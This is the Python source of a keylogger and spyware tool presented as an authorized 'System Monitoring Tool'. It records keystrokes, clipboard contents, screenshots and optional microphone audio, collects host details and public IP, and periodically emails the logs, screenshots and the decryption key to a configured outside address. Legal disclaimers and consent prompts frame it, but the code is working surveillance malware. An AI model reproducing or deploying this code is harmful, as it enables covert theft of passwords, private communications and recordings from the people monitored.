"""
System Monitoring Tool - Educational and Authorized Testing Only

LEGAL NOTICE:
This tool is designed EXCLUSIVELY for:
- Authorized security testing with written permission
- Educational purposes in controlled environments
- Parental monitoring with proper legal authority
- Corporate IT monitoring with employee consent and proper authorization
- Security research on systems you own

UNAUTHORIZED USE IS ILLEGAL and may violate:
- Computer Fraud and Abuse Act (CFAA)
- Electronic Communications Privacy Act (ECPA)
- State and local privacy laws
- Workplace privacy regulations

Author: Educational purposes only
License: Use only with proper authorization
"""

import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
import sys
from datetime import datetime
from scipy.io.wavfile import write as write_wav
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support, Event
from PIL import ImageGrab
import configparser
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import glob
import shutil
from pathlib import Path


# ============================================================================
# CONFIGURATION AND INITIALIZATION
# ============================================================================

class Config:
    """Configuration manager for the monitoring tool"""

    def __init__(self, config_file='config.ini'):
        self.config = configparser.ConfigParser()
        self.config_file = config_file
        self.base_path = os.path.dirname(os.path.abspath(__file__))

        if not os.path.exists(config_file):
            print(f"ERROR: Configuration file '{config_file}' not found!")
            print(f"Please copy 'config.example.ini' to '{config_file}' and configure it.")
            sys.exit(1)

        self.config.read(config_file)
        self._create_directories()

    def _create_directories(self):
        """Create necessary directories for logs and data"""
        dirs = [
            self.get('Paths', 'log_directory', 'logs'),
            self.get('Paths', 'screenshot_directory', 'screenshots'),
            self.get('Paths', 'audio_directory', 'audio')
        ]
        for directory in dirs:
            os.makedirs(directory, exist_ok=True)

    def get(self, section, option, fallback=None):
        """Safely get configuration value"""
        try:
            return self.config.get(section, option)
        except (configparser.NoSectionError, configparser.NoOptionError):
            return fallback

    def getint(self, section, option, fallback=0):
        """Get integer configuration value"""
        try:
            return self.config.getint(section, option)
        except (configparser.NoSectionError, configparser.NoOptionError, ValueError):
            return fallback

    def getboolean(self, section, option, fallback=False):
        """Get boolean configuration value"""
        try:
            return self.config.getboolean(section, option)
        except (configparser.NoSectionError, configparser.NoOptionError, ValueError):
            return fallback


# ============================================================================
# ENCRYPTION UTILITIES
# ============================================================================

class EncryptionManager:
    """Manages encryption and decryption of sensitive data"""

    def __init__(self, key_file='encryption.key'):
        self.key_file = key_file
        self.cipher = None
        self._load_or_create_key()

    def _load_or_create_key(self):
        """Load existing encryption key or create a new one"""
        try:
            if os.path.exists(self.key_file):
                with open(self.key_file, 'rb') as f:
                    key = f.read()
                logging.info("Loaded existing encryption key")
            else:
                key = Fernet.generate_key()
                with open(self.key_file, 'wb') as f:
                    f.write(key)
                logging.info("Generated new encryption key")

            self.cipher = Fernet(key)
        except Exception as e:
            logging.error(f"Encryption key error: {e}")
            raise

    def encrypt(self, data):
        """Encrypt data (accepts string or bytes)"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            return self.cipher.encrypt(data)
        except Exception as e:
            logging.error(f"Encryption error: {e}")
            return data

    def decrypt(self, data):
        """Decrypt data"""
        try:
            return self.cipher.decrypt(data).decode('utf-8')
        except Exception as e:
            logging.error(f"Decryption error: {e}")
            return data


# ============================================================================
# AUTHORIZATION AND CONSENT
# ============================================================================

def check_authorization():
    """
    Require explicit user authorization before starting monitoring.
    This ensures informed consent and legal compliance.
    """
    print("\n" + "="*70)
    print("SYSTEM MONITORING TOOL - AUTHORIZATION REQUIRED")
    print("="*70)
    print("\nLEGAL WARNING:")
    print("This tool captures keystrokes, screenshots, clipboard data, and")
    print("other sensitive information. Use ONLY on systems you own or have")
    print("explicit written authorization to monitor.")
    print("\nUNAUTHORIZED USE IS ILLEGAL AND MAY RESULT IN:")
    print("- Criminal prosecution")
    print("- Civil liability")
    print("- Violation of privacy laws")
    print("\nBy proceeding, you confirm that:")
    print("1. You have legal authority to monitor this system")
    print("2. You have obtained necessary consent from all parties")
    print("3. You comply with all applicable laws and regulations")
    print("4. You take full responsibility for the use of this tool")
    print("="*70)

    response = input("\nDo you have proper authorization to monitor this system? (yes/no): ")

    if response.lower() != 'yes':
        print("\nAuthorization denied. Exiting...")
        sys.exit(0)

    # Second confirmation for critical features
    print("\n" + "="*70)
    print("MONITORING FEATURES:")
    print("- Keystroke logging")
    print("- Screenshot capture")
    print("- Clipboard monitoring")
    print("- System information collection")
    print("- Optional: Audio recording")
    print("="*70)

    confirm = input("\nI understand and accept full responsibility (type 'I ACCEPT'): ")

    if confirm != 'I ACCEPT':
        print("\nConfirmation failed. Exiting...")
        sys.exit(0)

    logging.info(f"Authorization granted by user: {getpass.getuser()} at {datetime.now()}")
    print("\nAuthorization confirmed. Starting monitoring...\n")


# ============================================================================
# SYSTEM INFORMATION COLLECTION
# ============================================================================

def collect_system_info():
    """
    Collect comprehensive system information for the report.

    Returns:
        dict: System information including IP, hostname, OS details
    """
    try:
        info = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
        }

        # Get local IP
        try:
            info['local_ip'] = socket.gethostbyname(socket.gethostname())
        except Exception:
            info['local_ip'] = 'Unable to retrieve'

        # Get public IP
        try:
            info['public_ip'] = get('https://api.ipify.org').text
        except Exception:
            info['public_ip'] = 'Unable to retrieve'

        logging.info("System information collected successfully")
        return info

    except Exception as e:
        logging.error(f"Error collecting system info: {e}")
        return {'error': str(e)}


def save_system_info(config, encryption_manager):
    """Save system information to encrypted file"""
    try:
        info = collect_system_info()
        log_dir = config.get('Paths', 'log_directory', 'logs')
        filename = os.path.join(log_dir, 'system_info.txt')

        # Format information
        content = "SYSTEM INFORMATION REPORT\n"
        content += "="*50 + "\n\n"
        for key, value in info.items():
            content += f"{key.replace('_', ' ').title()}: {value}\n"

        # Encrypt if enabled
        if config.getboolean('Security', 'encrypt_logs', True):
            encrypted_data = encryption_manager.encrypt(content)
            with open(filename, 'wb') as f:
                f.write(encrypted_data)
        else:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(content)

        logging.info(f"System information saved to {filename}")

    except Exception as e:
        logging.error(f"Error saving system info: {e}")


# ============================================================================
# KEYSTROKE LOGGING
# ============================================================================

class KeystrokeLogger:
    """Enhanced keystroke logger with timestamps and encryption"""

    def __init__(self, config, encryption_manager, stop_event):
        self.config = config
        self.encryption_manager = encryption_manager
        self.stop_event = stop_event
        self.keys = []
        self.count = 0
        self.buffer_size = config.getint('Intervals', 'keystroke_buffer', 10)
        self.log_dir = config.get('Paths', 'log_directory', 'logs')
        self.log_file = os.path.join(self.log_dir, 'keystrokes.txt')

    def on_press(self, key):
        """Handle key press events"""
        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self.keys.append((timestamp, key))
            self.count += 1

            if self.count >= self.buffer_size:
                self.write_keys()
                self.keys = []
                self.count = 0

        except Exception as e:
            logging.error(f"Error in on_press: {e}")

    def on_release(self, key):
        """Handle key release events"""
        # Stop on ESC key
        if key == Key.esc or self.stop_event.is_set():
            # Write remaining keys
            if self.keys:
                self.write_keys()
            return False

    def write_keys(self):
        """Write keystroke buffer to encrypted log file"""
        try:
            content = ""
            for timestamp, key in self.keys:
                key_str = str(key).replace("'", "")

                if key_str.find("space") > 0:
                    key_str = " "
                elif key_str.find("enter") > 0 or key_str.find("return") > 0:
                    key_str = "\n"
                elif key_str.find("tab") > 0:
                    key_str = "\t"
                elif key_str.find("Key.") >= 0:
                    key_str = f" [{key_str}] "

                content += f"[{timestamp}] {key_str}"

            # Encrypt if enabled
            if self.config.getboolean('Security', 'encrypt_logs', True):
                encrypted_data = self.encryption_manager.encrypt(content)
                with open(self.log_file, 'ab') as f:
                    f.write(encrypted_data + b'\n')
            else:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(content + '\n')

        except Exception as e:
            logging.error(f"Error writing keystrokes: {e}")

    def start(self):
        """Start the keystroke listener"""
        logging.info("Keystroke logging started")
        try:
            with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                listener.join()
        except Exception as e:
            logging.error(f"Keystroke logging error: {e}")
        finally:
            logging.info("Keystroke logging stopped")


# ============================================================================
# CLIPBOARD MONITORING
# ============================================================================

def monitor_clipboard(config, encryption_manager, stop_event):
    """
    Monitor clipboard contents at regular intervals.

    Args:
        config: Configuration object
        encryption_manager: Encryption manager instance
        stop_event: Event to signal process termination
    """
    logging.info("Clipboard monitoring started")
    log_dir = config.get('Paths', 'log_directory', 'logs')
    log_file = os.path.join(log_dir, 'clipboard.txt')
    interval = config.getint('Intervals', 'clipboard_interval', 60)
    last_content = ""

    try:
        while not stop_event.is_set():
            try:
                win32clipboard.OpenClipboard()
                clipboard_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                # Only log if content changed
                if clipboard_data and clipboard_data != last_content:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    content = f"\n[{timestamp}]\n{clipboard_data}\n{'-'*50}\n"

                    # Encrypt if enabled
                    if config.getboolean('Security', 'encrypt_logs', True):
                        encrypted_data = encryption_manager.encrypt(content)
                        with open(log_file, 'ab') as f:
                            f.write(encrypted_data)
                    else:
                        with open(log_file, 'a', encoding='utf-8') as f:
                            f.write(content)

                    last_content = clipboard_data
                    logging.debug("Clipboard content captured")

            except Exception as e:
                # Clipboard errors are common and usually not critical
                pass

            time.sleep(interval)

    except Exception as e:
        logging.error(f"Clipboard monitoring error: {e}")
    finally:
        logging.info("Clipboard monitoring stopped")


# ============================================================================
# SCREENSHOT CAPTURE
# ============================================================================

def capture_screenshots(config, stop_event):
    """
    Capture screenshots at regular intervals.

    Args:
        config: Configuration object
        stop_event: Event to signal process termination
    """
    logging.info("Screenshot capture started")
    screenshot_dir = config.get('Paths', 'screenshot_directory', 'screenshots')
    interval = config.getint('Intervals', 'screenshot_interval', 300)

    try:
        while not stop_event.is_set():
            try:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = os.path.join(screenshot_dir, f'screenshot_{timestamp}.png')

                screenshot = ImageGrab.grab()
                screenshot.save(filename)

                logging.info(f"Screenshot saved: {filename}")

            except Exception as e:
                logging.error(f"Screenshot capture error: {e}")

            time.sleep(interval)

    except Exception as e:
        logging.error(f"Screenshot process error: {e}")
    finally:
        logging.info("Screenshot capture stopped")


# ============================================================================
# AUDIO RECORDING
# ============================================================================

def record_audio(config, stop_event):
    """
    Record audio at regular intervals.

    WARNING: Audio recording may have additional legal restrictions.
    Always ensure compliance with wiretapping and consent laws.

    Args:
        config: Configuration object
        stop_event: Event to signal process termination
    """
    logging.info("Audio recording started - ENSURE LEGAL COMPLIANCE")
    audio_dir = config.get('Paths', 'audio_directory', 'audio')
    duration = config.getint('Intervals', 'audio_duration', 30)
    sample_rate = 44100

    try:
        while not stop_event.is_set():
            try:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = os.path.join(audio_dir, f'audio_{timestamp}.wav')

                logging.info(f"Recording audio for {duration} seconds...")
                recording = sd.rec(int(duration * sample_rate),
                                 samplerate=sample_rate,
                                 channels=2)
                sd.wait()

                write_wav(filename, sample_rate, recording)
                logging.info(f"Audio saved: {filename}")

            except Exception as e:
                logging.error(f"Audio recording error: {e}")

            # Wait before next recording
            if not stop_event.is_set():
                time.sleep(60)

    except Exception as e:
        logging.error(f"Audio process error: {e}")
    finally:
        logging.info("Audio recording stopped")


# ============================================================================
# EMAIL REPORTING
# ============================================================================

class EmailReporter:
    """Manages email reporting functionality"""

    def __init__(self, config):
        self.config = config
        self.smtp_server = config.get('Email', 'smtp_server')
        self.smtp_port = config.getint('Email', 'smtp_port', 587)
        self.sender_email = config.get('Email', 'sender_email')
        self.sender_password = config.get('Email', 'sender_password')
        self.receiver_email = config.get('Email', 'receiver_email')

    def send_report(self, subject="System Monitoring Report", body="", attachments=None):
        """
        Send email report with attachments.

        Args:
            subject: Email subject line
            body: Email body text
            attachments: List of file paths to attach

        Returns:
            bool: True if successful, False otherwise
        """
        max_retries = 3
        retry_delay = 10

        for attempt in range(max_retries):
            try:
                # Create message
                message = MIMEMultipart()
                message['From'] = self.sender_email
                message['To'] = self.receiver_email
                message['Subject'] = subject

                # Add body
                message.attach(MIMEText(body, 'plain'))

                # Add attachments
                if attachments:
                    for filepath in attachments:
                        if os.path.exists(filepath):
                            try:
                                with open(filepath, 'rb') as f:
                                    part = MIMEBase('application', 'octet-stream')
                                    part.set_payload(f.read())
                                encoders.encode_base64(part)
                                part.add_header('Content-Disposition',
                                              f'attachment; filename= {os.path.basename(filepath)}')
                                message.attach(part)
                            except Exception as e:
                                logging.error(f"Error attaching file {filepath}: {e}")

                # Send email
                with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                    server.starttls()
                    server.login(self.sender_email, self.sender_password)
                    server.send_message(message)

                logging.info(f"Email report sent successfully to {self.receiver_email}")
                return True

            except Exception as e:
                logging.error(f"Email send attempt {attempt + 1} failed: {e}")
                if attempt < max_retries - 1:
                    time.sleep(retry_delay * (2 ** attempt))  # Exponential backoff
                else:
                    logging.error("All email send attempts failed")
                    return False

    def prepare_and_send_report(self, config):
        """Prepare comprehensive report and send via email"""
        try:
            # Collect system info
            system_info = collect_system_info()

            # Prepare email body
            body = "SYSTEM MONITORING REPORT\n"
            body += "="*60 + "\n\n"
            body += "System Information:\n"
            body += "-"*60 + "\n"
            for key, value in system_info.items():
                body += f"{key.replace('_', ' ').title()}: {value}\n"
            body += "\n" + "="*60 + "\n"
            body += "Detailed logs and captures are attached.\n"
            body += "\nThis is an automated monitoring report.\n"

            # Collect all log files and recent screenshots
            attachments = []

            # Add log files
            log_dir = config.get('Paths', 'log_directory', 'logs')
            for log_file in glob.glob(os.path.join(log_dir, '*.txt')):
                attachments.append(log_file)

            # Add recent screenshots (last 5)
            screenshot_dir = config.get('Paths', 'screenshot_directory', 'screenshots')
            screenshots = sorted(glob.glob(os.path.join(screenshot_dir, '*.png')),
                               reverse=True)[:5]
            attachments.extend(screenshots)

            # Add encryption key (important for decryption)
            key_file = config.get('Paths', 'encryption_key_file', 'encryption.key')
            if os.path.exists(key_file):
                attachments.append(key_file)

            # Send report
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            subject = f"System Monitoring Report - {timestamp}"

            success = self.send_report(subject, body, attachments)

            if success and config.getboolean('Security', 'auto_cleanup', True):
                self.cleanup_old_files(config)

            return success

        except Exception as e:
            logging.error(f"Error preparing report: {e}")
            return False

    def cleanup_old_files(self, config):
        """Clean up old log files and screenshots"""
        try:
            max_age_days = config.getint('Security', 'max_log_age_days', 7)
            current_time = time.time()
            max_age_seconds = max_age_days * 24 * 60 * 60

            # Clean logs
            log_dir = config.get('Paths', 'log_directory', 'logs')
            for filepath in glob.glob(os.path.join(log_dir, '*')):
                if os.path.isfile(filepath):
                    if current_time - os.path.getmtime(filepath) > max_age_seconds:
                        os.remove(filepath)
                        logging.info(f"Removed old file: {filepath}")

            # Clean screenshots
            screenshot_dir = config.get('Paths', 'screenshot_directory', 'screenshots')
            for filepath in glob.glob(os.path.join(screenshot_dir, '*')):
                if os.path.isfile(filepath):
                    if current_time - os.path.getmtime(filepath) > max_age_seconds:
                        os.remove(filepath)
                        logging.info(f"Removed old screenshot: {filepath}")

            # Clean audio
            audio_dir = config.get('Paths', 'audio_directory', 'audio')
            for filepath in glob.glob(os.path.join(audio_dir, '*')):
                if os.path.isfile(filepath):
                    if current_time - os.path.getmtime(filepath) > max_age_seconds:
                        os.remove(filepath)
                        logging.info(f"Removed old audio: {filepath}")

        except Exception as e:
            logging.error(f"Cleanup error: {e}")


def email_reporter_process(config, stop_event):
    """
    Background process for periodic email reporting.

    Args:
        config: Configuration object
        stop_event: Event to signal process termination
    """
    logging.info("Email reporter started")
    reporter = EmailReporter(config)
    interval = config.getint('Intervals', 'email_interval', 3600)

    try:
        while not stop_event.is_set():
            # Wait for interval
            time.sleep(interval)

            if not stop_event.is_set():
                logging.info("Preparing to send email report...")
                reporter.prepare_and_send_report(config)

    except Exception as e:
        logging.error(f"Email reporter error: {e}")
    finally:
        logging.info("Email reporter stopped")


# ============================================================================
# MAIN APPLICATION
# ============================================================================

def setup_logging():
    """Configure logging system"""
    log_format = '%(asctime)s - %(levelname)s - %(message)s'
    logging.basicConfig(
        level=logging.INFO,
        format=log_format,
        handlers=[
            logging.FileHandler('monitor.log'),
            logging.StreamHandler(sys.stdout)
        ]
    )


def main():
    """Main application entry point"""

    # Windows multiprocessing support
    freeze_support()

    # Setup logging
    setup_logging()

    logging.info("="*70)
    logging.info("System Monitoring Tool Starting")
    logging.info("="*70)

    # Check authorization
    check_authorization()

    try:
        # Load configuration
        config = Config('config.ini')
        logging.info("Configuration loaded successfully")

        # Initialize encryption
        key_file = config.get('Paths', 'encryption_key_file', 'encryption.key')
        encryption_manager = EncryptionManager(key_file)
        logging.info("Encryption manager initialized")

        # Save initial system information
        if config.getboolean('Features', 'enable_system_info', True):
            save_system_info(config, encryption_manager)

        # Create stop event for graceful shutdown
        stop_event = Event()

        # List to track all processes
        processes = []

        try:
            # Start keystroke logging
            if config.getboolean('Features', 'enable_keylogging', True):
                keystroke_logger = KeystrokeLogger(config, encryption_manager, stop_event)
                p = Process(target=keystroke_logger.start)
                p.start()
                processes.append(p)
                logging.info("Keystroke logging process started")

            # Start clipboard monitoring
            if config.getboolean('Features', 'enable_clipboard', True):
                p = Process(target=monitor_clipboard,
                          args=(config, encryption_manager, stop_event))
                p.start()
                processes.append(p)
                logging.info("Clipboard monitoring process started")

            # Start screenshot capture
            if config.getboolean('Features', 'enable_screenshots', True):
                p = Process(target=capture_screenshots,
                          args=(config, stop_event))
                p.start()
                processes.append(p)
                logging.info("Screenshot capture process started")

            # Start audio recording (if enabled)
            if config.getboolean('Features', 'enable_audio', False):
                print("\nWARNING: Audio recording enabled!")
                print("Ensure compliance with wiretapping and consent laws.")
                confirm = input("Continue with audio recording? (yes/no): ")
                if confirm.lower() == 'yes':
                    p = Process(target=record_audio,
                              args=(config, stop_event))
                    p.start()
                    processes.append(p)
                    logging.info("Audio recording process started")

            # Start email reporter
            p = Process(target=email_reporter_process,
                       args=(config, stop_event))
            p.start()
            processes.append(p)
            logging.info("Email reporter process started")

            # Main monitoring loop
            print("\n" + "="*70)
            print("MONITORING ACTIVE")
            print("="*70)
            print("Press ESC to stop monitoring")
            print("Logs are being saved and encrypted")
            print(f"Email reports will be sent every {config.getint('Intervals', 'email_interval', 3600)} seconds")
            print("="*70 + "\n")

            # Wait for all processes
            for p in processes:
                p.join()

        except KeyboardInterrupt:
            logging.info("Keyboard interrupt received")

        finally:
            # Graceful shutdown
            logging.info("Initiating graceful shutdown...")
            stop_event.set()

            # Give processes time to finish
            time.sleep(2)

            # Terminate any remaining processes
            for p in processes:
                if p.is_alive():
                    p.terminate()
                    p.join(timeout=5)

            # Send final report
            logging.info("Sending final report...")
            reporter = EmailReporter(config)
            reporter.prepare_and_send_report(config)

            logging.info("System monitoring stopped successfully")
            print("\nMonitoring stopped. Final report sent.")

    except Exception as e:
        logging.error(f"Fatal error: {e}")
        print(f"\nFATAL ERROR: {e}")
        print("Check monitor.log for details")
        sys.exit(1)


if __name__ == "__main__":
    main()
